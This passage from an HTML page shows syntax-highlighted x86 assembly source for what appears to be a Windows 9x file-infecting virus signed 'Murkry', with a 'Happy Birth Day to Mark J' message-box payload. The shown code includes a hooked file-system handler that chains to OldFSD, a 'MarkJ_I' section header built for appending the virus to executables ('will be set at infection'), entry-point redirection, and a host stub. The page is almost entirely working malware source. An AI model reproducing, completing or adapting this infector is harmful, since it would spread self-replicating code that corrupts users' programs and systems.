        </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">18H</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">14H</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">10H</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">0CH</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">08H</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">;mov    eax,00000000</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0b8h</span><span class="sc0">
</span><span class="sc5">OldFSD</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">00000018</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">leave</span><span class="sc0">                                   </span><span class="sc1">;402533h</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;********************************************</span><span class="sc0">
</span><span class="sc5">VxDIFS</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">20h</span><span class="sc0">                              </span><span class="sc1">;402500h</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">     </span><span class="sc2">00400032h</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;********************************************</span><span class="sc0">

</span><span class="sc5">MFlag</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Flag1</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">EBox</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">butt1</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">butt2</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">   </span><span class="sc2">8001</span><span class="sc0">
</span><span class="sc5">butt3</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">TitleOff</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TitleEB</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">markj</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc2">0c0000000h</span><span class="sc0">
</span><span class="sc5">TextOff</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TextEB</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">markj</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc2">0c0000000h</span><span class="sc0">

</span><span class="sc5">TitleEB</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Happy Birth Day to Mark J '</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">TextEB</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'From Murkry'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">SectName</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"MarkJ_I "</span><span class="sc0">
</span><span class="sc5">Physadd</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EndVirus</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">StartOfVirus</span><span class="sc0">
</span><span class="sc5">VirtualAdd</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0c0000000h</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">400000h</span><span class="sc0">  </span><span class="sc1">;bfc00000</span><span class="sc0">
</span><span class="sc5">SizeRawData</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EndVirus</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">StartOfVirus</span><span class="sc0">
</span><span class="sc5">PntrRawData</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">                           </span><span class="sc1">;will be set at infection</span><span class="sc0">
</span><span class="sc5">PnterReloc</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PnterLine</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Character</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0c0000040h</span><span class="sc0">

       </span><span class="sc1">;sub      eax, offset HOST - 400000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">2dh</span><span class="sc0">
</span><span class="sc5">NewEipRva</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HOST</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">400000h</span><span class="sc0">  

       </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">400000h</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0">      </span><span class="sc5">GetOut</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CheckTsr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">markj</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAt</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0">      </span><span class="sc5">GetOut</span><span class="sc0">

       </span><span class="sc1">;EAX     ;current base address</span><span class="sc0">
       </span><span class="sc6">pushad</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">DoNothing</span><span class="sc0">
</span><span class="sc5">DoNothing</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0bh</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc2">0c0000000h</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Here</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">popad</span><span class="sc0">
        
</span><span class="sc5">GetOut</span><span class="sc4">:</span><span class="sc0">
        
       </span><span class="sc1">;add     eax, offset return - 400000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">05h</span><span class="sc0">
</span><span class="sc5">OldEipRva</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">       </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">400000h</span><span class="sc0">

       </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------</span><span class="sc0">



</span><span class="sc5">EndVirus</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">FileName</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">100</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">00</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">;holds the file name</span><span class="sc0">

 
</span><span class="sc5">PEPtr</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FileSize</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Buffer</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">400h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">00</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">CheckTsr</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00</span><span class="sc0">

</span><span class="sc5">DummyCode</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;--------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">                                   </span><span class="sc1">;executable code starts here</span><span class="sc0">

</span><span class="sc5">HOST</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc1">;sub      eax, offset HOST - 400000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">2dh</span><span class="sc0">
</span><span class="sc5">NewEipRva1</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HOST</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">400000h</span><span class="sc0">  

       </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">400000h</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0">      </span><span class="sc5">GetOut1</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CheckTsr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">markj</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAt</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0">      </span><span class="sc5">GetOut1</span><span class="sc0">

       </span><span class="sc1">;EAX     ;current base address</span><span class="sc0">
       </span><span class="sc6">pushad</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">DoNothing1</span><span class="sc0">
</span><span class="sc5">DoNothing1</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0bh</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc2">0c0000000h</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Here1</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">popad</span><span class="sc0">
        
</span><span class="sc5">GetOut1</span><span class="sc4">:</span><span class="sc0">
        
       </span><span class="sc1">;add     eax, offset return - 400000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">05h</span><span class="sc0">
</span><span class="sc5">OldEipRva1</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">       </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">400000h</span><span class="sc0">

       </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------</span><span class="sc0">

</span><span class="sc5">return</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">LARGE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ExitProcess</span><span class="sc0">              

        </span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">HOST</span><span class="sc0">
</span></div></body>
</html>
